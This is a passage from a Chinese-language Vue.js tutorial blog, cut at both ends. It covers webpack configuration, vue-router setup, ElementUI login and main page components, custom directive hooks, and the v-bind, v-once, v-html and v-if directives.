js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> webpack = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack&#x27;</span>);<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-comment">//确定入口</span><br>    <span class="hljs-attr">entry</span>: [<br>        <span class="hljs-string">&#x27;webpack/hot/only-dev-server&#x27;</span>,<br>        <span class="hljs-string">&#x27;./js/app.js&#x27;</span><br>    ],<br>    <span class="hljs-comment">//用于定义构建后的文件的输出。</span><br>    <span class="hljs-attr">output</span>: &#123;<br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;./build&#x27;</span>,<br>        <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;bundle.js&#x27;</span><br>    &#125;,<br>    <span class="hljs-comment">//关于模块的加载相关，</span><br>    <span class="hljs-attr">module</span>: &#123;<br>        <span class="hljs-attr">loaders</span>: [<br>        &#123; <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.js?$/</span>, <span class="hljs-attr">loaders</span>: [<span class="hljs-string">&#x27;react-hot&#x27;</span>, <span class="hljs-string">&#x27;babel&#x27;</span>], <span class="hljs-attr">exclude</span>:     <span class="hljs-regexp">/node_modules/</span> &#125;,<br>        &#123; <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.js$/</span>, <span class="hljs-attr">exclude</span>: <span class="hljs-regexp">/node_modules/</span>, <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;babel-loader&#x27;</span>&#125;,<br>        &#123; <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.css$/</span>, <span class="hljs-attr">loader</span>: <span class="hljs-string">&quot;style!css&quot;</span> &#125;,<br>        &#123;<span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.less/</span>,<span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;style-loader!css-loader!less-loader&#x27;</span>&#125;<br>        ]<br>    &#125;,<br>    <span class="hljs-comment">//webpack在构建包的时候会按目录的进行文件的查找</span><br>    <span class="hljs-attr">resolve</span>:&#123;<br>        <span class="hljs-attr">extensions</span>:[<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;.js&#x27;</span>,<span class="hljs-string">&#x27;.json&#x27;</span>]<br>    &#125;,<br>    <span class="hljs-comment">//当我们想在项目中require一些其他的类库或者API，而又不想让这些类库的源码被构建到运行时文件中，这在实际开发中很有必要。</span><br>    <span class="hljs-attr">plugins</span>: [<br>        <span class="hljs-keyword">new</span> webpack.<span class="hljs-title class_">NoErrorsPlugin</span>()<br>    ]<br>&#125;;<br></code></pre></td></tr></table></figure><p>然后运行下面这条命令即可打包</p><blockquote><p>webpack</p></blockquote><h3 id="vue-router"><a href="#vue-router" class="headerlink" title="vue-router"></a>vue-router</h3><p>&#x3D;&#x3D;在所需要的项目中进行安装&#x3D;&#x3D;</p><p>cnpm install vue-router –save-dev</p><p>创建一个路由js并书写代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Router</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-router&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Content</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../components/Content&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Main</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../components/Main&#x27;</span><br><br><span class="hljs-comment">//vue使用插件</span><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Router</span>);<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>(&#123;<br>  <span class="hljs-attr">routes</span>:[<br>    &#123;<br>      <span class="hljs-attr">path</span>:<span class="hljs-string">&quot;/content&quot;</span>,<br>      <span class="hljs-attr">name</span>:<span class="hljs-string">&quot;content&quot;</span>,<br>      <span class="hljs-attr">component</span>:<span class="hljs-title class_">Content</span>,<br>    &#125;,&#123;<br>      <span class="hljs-attr">path</span>:<span class="hljs-string">&quot;/main&quot;</span>,<br>      <span class="hljs-attr">name</span>:<span class="hljs-string">&quot;main&quot;</span>,<br>      <span class="hljs-attr">component</span>:<span class="hljs-title class_">Main</span>,<br>    &#125;<br><br>  ]<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>首先需要导入一个Vue,并对导入后的Router进行引用</p><blockquote><p>Vue.use(Router);</p></blockquote><p>然后是编写一个默认导出的路由routes是所有的路由规则对应含一个类数组</p><p>每个类中path代表访问路由,name代表路由名称,component代表路由所对应的内容.</p><h3 id="总体过程"><a href="#总体过程" class="headerlink" title="总体过程"></a>总体过程</h3><p>首先新建一个文件夹比如MyVue</p><blockquote><p>vue init webpack MyVue</p><p>cd MyVue</p><p>cnpm install vue-router –save-dev</p><p>cnpm i element-ui -S&#x2F;&#x2F;安装ElementUI</p><p>cnpm install axios</p><p>cnpm install&#x2F;&#x2F;安装所有依赖</p><p>cnpm install sass-loader node-sass –save-dev</p><p>npm run dev&#x2F;&#x2F;运行</p></blockquote><p>&#x3D;&#x3D;这些都运行玩后再用idea打开,否则可能出现语句不提示功能&#x3D;&#x3D;</p><h4 id="编写视图页"><a href="#编写视图页" class="headerlink" title="编写视图页"></a>编写视图页</h4><h5 id="Login-Vue"><a href="#Login-Vue" class="headerlink" title="Login.Vue"></a>Login.Vue</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;el-form ref=&quot;form&quot; :model=&quot;form&quot; label-width=&quot;80px&quot;&gt;<br>    &lt;el-form-item label=&quot;活动名称&quot;&gt;<br>      &lt;el-input v-model=&quot;form.name&quot;&gt;&lt;/el-input&gt;<br>    &lt;/el-form-item&gt;<br>    &lt;el-form-item label=&quot;活动区域&quot;&gt;<br>      &lt;el-select v-model=&quot;form.region&quot; placeholder=&quot;请选择活动区域&quot;&gt;<br>        &lt;el-option label=&quot;区域一&quot; value=&quot;shanghai&quot;&gt;&lt;/el-option&gt;<br>        &lt;el-option label=&quot;区域二&quot; value=&quot;beijing&quot;&gt;&lt;/el-option&gt;<br>      &lt;/el-select&gt;<br>    &lt;/el-form-item&gt;<br>    &lt;el-form-item label=&quot;活动时间&quot;&gt;<br>      &lt;el-col :span=&quot;11&quot;&gt;<br>        &lt;el-date-picker type=&quot;date&quot; placeholder=&quot;选择日期&quot; v-model=&quot;form.date1&quot; style=&quot;width: 100%;&quot;&gt;&lt;/el-date-picker&gt;<br>      &lt;/el-col&gt;<br>      &lt;el-col class=&quot;line&quot; :span=&quot;2&quot;&gt;-&lt;/el-col&gt;<br>      &lt;el-col :span=&quot;11&quot;&gt;<br>        &lt;el-time-picker placeholder=&quot;选择时间&quot; v-model=&quot;form.date2&quot; style=&quot;width: 100%;&quot;&gt;&lt;/el-time-picker&gt;<br>      &lt;/el-col&gt;<br>    &lt;/el-form-item&gt;<br>    &lt;el-form-item label=&quot;即时配送&quot;&gt;<br>      &lt;el-switch v-model=&quot;form.delivery&quot;&gt;&lt;/el-switch&gt;<br>    &lt;/el-form-item&gt;<br>    &lt;el-form-item label=&quot;活动性质&quot;&gt;<br>      &lt;el-checkbox-group v-model=&quot;form.type&quot;&gt;<br>        &lt;el-checkbox label=&quot;美食/餐厅线上活动&quot; name=&quot;type&quot;&gt;&lt;/el-checkbox&gt;<br>        &lt;el-checkbox label=&quot;地推活动&quot; name=&quot;type&quot;&gt;&lt;/el-checkbox&gt;<br>        &lt;el-checkbox label=&quot;线下主题活动&quot; name=&quot;type&quot;&gt;&lt;/el-checkbox&gt;<br>        &lt;el-checkbox label=&quot;单纯品牌曝光&quot; name=&quot;type&quot;&gt;&lt;/el-checkbox&gt;<br>      &lt;/el-checkbox-group&gt;<br>    &lt;/el-form-item&gt;<br>    &lt;el-form-item label=&quot;特殊资源&quot;&gt;<br>      &lt;el-radio-group v-model=&quot;form.resource&quot;&gt;<br>        &lt;el-radio label=&quot;线上品牌商赞助&quot;&gt;&lt;/el-radio&gt;<br>        &lt;el-radio label=&quot;线下场地免费&quot;&gt;&lt;/el-radio&gt;<br>      &lt;/el-radio-group&gt;<br>    &lt;/el-form-item&gt;<br>    &lt;el-form-item label=&quot;活动形式&quot;&gt;<br>      &lt;el-input type=&quot;textarea&quot; v-model=&quot;form.desc&quot;&gt;&lt;/el-input&gt;<br>    &lt;/el-form-item&gt;<br>    &lt;el-form-item&gt;<br>      &lt;el-button type=&quot;primary&quot; @click=&quot;onSubmit&quot;&gt;立即创建&lt;/el-button&gt;<br>      &lt;el-button&gt;取消&lt;/el-button&gt;<br>    &lt;/el-form-item&gt;<br>  &lt;/el-form&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>  export default &#123;<br>    data() &#123;<br>      return &#123;<br>        form: &#123;<br>          name: &#x27;&#x27;,<br>          region: &#x27;&#x27;,<br>          date1: &#x27;&#x27;,<br>          date2: &#x27;&#x27;,<br>          delivery: false,<br>          type: [],<br>          resource: &#x27;&#x27;,<br>          desc: &#x27;&#x27;<br>        &#125;<br>      &#125;<br>    &#125;,<br>    methods: &#123;<br>      onSubmit() &#123;<br>        console.log(&#x27;submit!&#x27;);<br>      &#125;<br>    &#125;<br>  &#125;<br>&lt;/script&gt;<br><br>&lt;style scoped&gt;<br><br>&lt;/style&gt;<br><br></code></pre></td></tr></table></figure><h5 id="Main-vue"><a href="#Main-vue" class="headerlink" title="Main.vue"></a>Main.vue</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>    &lt;h1&gt;首页<br>    &lt;/h1&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>    export default &#123;<br>        name: &quot;Main&quot;<br>    &#125;<br>&lt;/script&gt;<br><br>&lt;style scoped&gt;<br><br>&lt;/style&gt;<br><br></code></pre></td></tr></table></figure><h4 id="修改App-vue页面"><a href="#修改App-vue页面" class="headerlink" title="修改App.vue页面"></a>修改App.vue页面</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div id=&quot;app&quot;&gt;<br>&lt;!--    &lt;img src=&quot;./assets/logo.png&quot;&gt;--&gt;<br>&lt;!--    &lt;HelloWorld/&gt;--&gt;<br>    &lt;router-link to=&quot;/login&quot;&gt;login&lt;/router-link&gt;<br>      <br>      //用于展示组件结果如router-link所指定的<br>    &lt;router-view&gt;&lt;/router-view&gt;<br>    首页<br>  &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>// import HelloWorld from &#x27;./components/HelloWorld&#x27;<br><br>export default &#123;<br>  name: &#x27;App&#x27;,<br>  components: &#123;<br>    // HelloWorld<br>  &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br>#app &#123;<br>  font-family: &#x27;Avenir&#x27;, Helvetica, Arial, sans-serif;<br>  -webkit-font-smoothing: antialiased;<br>  -moz-osx-font-smoothing: grayscale;<br>  text-align: center;<br>  color: #2c3e50;<br>  margin-top: 60px;<br>&#125;<br>&lt;/style&gt;<br><br></code></pre></td></tr></table></figure><h4 id="编写主页面"><a href="#编写主页面" class="headerlink" title="编写主页面"></a>编写主页面</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// The Vue build version to load with the `import` command</span><br><span class="hljs-comment">// (runtime-only or standalone) has been set in webpack.base.conf with an alias.</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App&#x27;</span><br><span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./router&#x27;</span><br><span class="hljs-keyword">import</span> elementUi <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-ui&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span>;<br><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(router);<br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(elementUi);<br><br><span class="hljs-comment">/* eslint-disable no-new */</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>  <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#app&#x27;</span>,<br>  router,<br>  <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> <span class="hljs-title function_">h</span>(<span class="hljs-title class_">App</span>)<br>&#125;)<br><br></code></pre></td></tr></table></figure><h4 id="编写路由页面"><a href="#编写路由页面" class="headerlink" title="编写路由页面"></a>编写路由页面</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Router</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-router&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Login</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../views/login&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Main</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../views/Main&#x27;</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Router</span>);<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>(&#123;<br>  <span class="hljs-attr">routes</span>:[<br>    &#123;<br>      <span class="hljs-attr">path</span>:<span class="hljs-string">&quot;/index&quot;</span>,<br>      <span class="hljs-attr">component</span>:<span class="hljs-title class_">Main</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-attr">path</span>:<span class="hljs-string">&quot;/login&quot;</span>,<br>      <span class="hljs-attr">component</span>:<span class="hljs-title class_">Login</span><br>    &#125;<br>  ]<br>&#125;)<br><br></code></pre></td></tr></table></figure><h2 id="钩子"><a href="#钩子" class="headerlink" title="钩子"></a>钩子</h2><h3 id="钩子函数"><a href="#钩子函数" class="headerlink" title="钩子函数"></a>钩子函数</h3><ul><li><code>bind</code>: 只调用一次，指令第一次绑定到元素时调用，用这个钩子函数可以定义一个在绑定时执行一次的初始化动作。</li><li><code>inserted</code>: 被绑定元素插入父节点时调用（父节点存在即可调用，不必存在于 document 中）。</li><li><code>update</code>: 被绑定元素所在的模板更新时调用，而不论绑定值是否变化。通过比较更新前后的绑定值，可以忽略不必要的模板更新</li><li><code>componentUpdated</code>: 被绑定元素所在模板完成一次更新周期时调用。</li><li><code>unbind</code>: 只调用一次， 指令与元素解绑时调用。</li></ul><h3 id="每个函数所带的参数"><a href="#每个函数所带的参数" class="headerlink" title="每个函数所带的参数"></a>每个函数所带的参数</h3><ul><li><strong>el</strong>: 指令所绑定的元素，可以用来直接操作 DOM 。</li><li>binding:一个对象，包含以下属性：<ul><li><strong>name</strong>: 指令名，不包括 <code>v-</code> 前缀。</li><li><strong>value</strong>: 指令的绑定值， 例如： <code>v-my-directive=&quot;1 + 1&quot;</code>, value 的值是 <code>2</code>。</li><li><strong>oldValue</strong>: 指令绑定的前一个值，仅在 <code>update</code> 和 <code>componentUpdated</code> 钩子中可用。无论值是否改变都可用。</li><li><strong>expression</strong>: 绑定值的表达式或变量名。 例如 <code>v-my-directive=&quot;1 + 1&quot;</code> ， expression 的值是 <code>&quot;1 + 1&quot;</code>。</li><li><strong>arg</strong>: 传给指令的参数。例如 <code>v-my-directive:foo</code>， arg 的值是 <code>&quot;foo&quot;</code>。</li><li><strong>modifiers</strong>: 一个包含修饰符的对象。 例如： <code>v-my-directive.foo.bar</code>, 修饰符对象 modifiers 的值是 <code>&#123; foo: true, bar: true &#125;</code>。</li></ul></li><li><strong>vnode</strong>: Vue 编译生成的虚拟节点。</li><li><strong>oldVnode</strong>: 上一个虚拟节点，仅在 <code>update</code> 和 <code>componentUpdated</code> 钩子中可用。</li></ul><blockquote><p>这是对上面的例子</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>  <span class="hljs-attr">v-runoob:hello.a.b</span>=<span class="hljs-string">&quot;message&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br> <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">directive</span>(<span class="hljs-string">&#x27;runoob&#x27;</span>, &#123;</span><br><span class="language-javascript">  <span class="hljs-attr">bind</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">el, binding, vnode</span>) &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> s = <span class="hljs-title class_">JSON</span>.<span class="hljs-property">stringify</span></span><br><span class="language-javascript">    el.<span class="hljs-property">innerHTML</span> =</span><br><span class="language-javascript">      <span class="hljs-string">&#x27;name: &#x27;</span>       + <span class="hljs-title function_">s</span>(binding.<span class="hljs-property">name</span>) + <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span> +</span><br><span class="language-javascript">      <span class="hljs-string">&#x27;value: &#x27;</span>      + <span class="hljs-title function_">s</span>(binding.<span class="hljs-property">value</span>) + <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span> +</span><br><span class="language-javascript">      <span class="hljs-string">&#x27;expression: &#x27;</span> + <span class="hljs-title function_">s</span>(binding.<span class="hljs-property">expression</span>) + <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span> +</span><br><span class="language-javascript">      <span class="hljs-string">&#x27;argument: &#x27;</span>   + <span class="hljs-title function_">s</span>(binding.<span class="hljs-property">arg</span>) + <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span> +</span><br><span class="language-javascript">      <span class="hljs-string">&#x27;modifiers: &#x27;</span>  + <span class="hljs-title function_">s</span>(binding.<span class="hljs-property">modifiers</span>) + <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span> +</span><br><span class="language-javascript">      <span class="hljs-string">&#x27;vnode keys: &#x27;</span> + <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(vnode).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;, &#x27;</span>)</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">  <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#app&#x27;</span>,</span><br><span class="language-javascript">  <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;菜鸟教程!&#x27;</span></span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="V指令"><a href="#V指令" class="headerlink" title="V指令"></a>V指令</h2><h3 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h3><p>v-bind绑定当前标签的属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">这样相当于用aaa变量绑定了div的value属性<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-bind:value</span>=<span class="hljs-string">&quot;aaa&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>对于布尔 attribute (它们只要存在就意味着值为 <code>true</code>)，<code>v-bind</code> 工作起来略有不同，在这个例子中：</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hsp">&lt;<span class="hljs-keyword">button</span> v-bind:disabled=<span class="hljs-string">&quot;isButtonDisabled&quot;</span>&gt;<span class="hljs-keyword">Button</span>&lt;/<span class="hljs-keyword">button</span>&gt;<br></code></pre></td></tr></table></figure><p>如果 <code>isButtonDisabled</code> 的值是 <code>null</code>、<code>undefined</code> 或 <code>false</code>，则 <code>disabled</code> attribute 甚至不会被包含在渲染出来的 <code>&lt;button&gt;</code> 元素中。</p><h3 id="v-once"><a href="#v-once" class="headerlink" title="v-once"></a>v-once</h3><p>v-once一次性绑定数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-once</span>&gt;</span>这个将不会改变: &#123;&#123; msg &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h3><p>v-html用来将文本解析为代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Using mustaches: &#123;&#123; rawHtml &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Using v-html directive: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-html</span>=<span class="hljs-string">&quot;rawHtml&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>结果:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">mustaches:<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color:red&quot;</span>&gt;</span>aaa<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>Using v-html directive:aaa<br></code></pre></td></tr></table></figure><h3 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h3><p>根据条件决定是否显示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;aaa&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>附加:<a href="https://cn.vuejs.org/v2/guide/conditional.html">https://cn.vuejs.org/v2/guide/conditional.html</a></p><p>由于vue尽可能的复用组件所以会有以下的情况</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;loginType === &#x27;username&#x27;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span 